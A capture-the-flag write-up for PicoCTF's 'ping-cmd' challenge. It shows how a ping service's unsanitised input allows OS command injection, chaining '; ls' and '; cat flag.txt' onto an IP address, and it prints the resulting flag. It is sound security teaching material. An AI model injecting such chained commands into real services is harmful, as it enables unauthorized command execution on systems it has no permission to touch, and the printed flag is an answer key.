PicoCTF: ping-cmd — Writeup

Executive Summary

This challenge involves interacting with a remote service that lets users “ping” an IP address. Although it claims to only allow 8.8.8.8, improper input handling leads to a command injection vulnerability, allowing arbitrary commands to be executed and the flag retrieved.

Challenge Goal

Retrieve the flag by interacting with a ping service.

Connect using:

nc mysterious-sea.picoctf.net 51093
Step 1 — Connect to the Service

After connecting, the service prompts:

Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8')

If you enter:

8.8.8.8

It performs a normal ping.

Step 2 — Test for Command Injection

The backend likely runs something like:

ping -c 2 <userinput>

Since input is directly passed to the shell, you can try command chaining:

8.8.8.8; ls

Output includes:

flag.txt
script.sh

This confirms command injection.

Step 3 — Read the Flag

Now execute:

8.8.8.8; cat flag.txt

Output:

picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_a9326567}
Why This Works

The application likely uses unsafe code such as:

os.system("ping -c 2 " + userinput)

Because user input is not sanitized, shell metacharacters like ; allow execution of additional commands.

This is a classic OS Command Injection vulnerability.
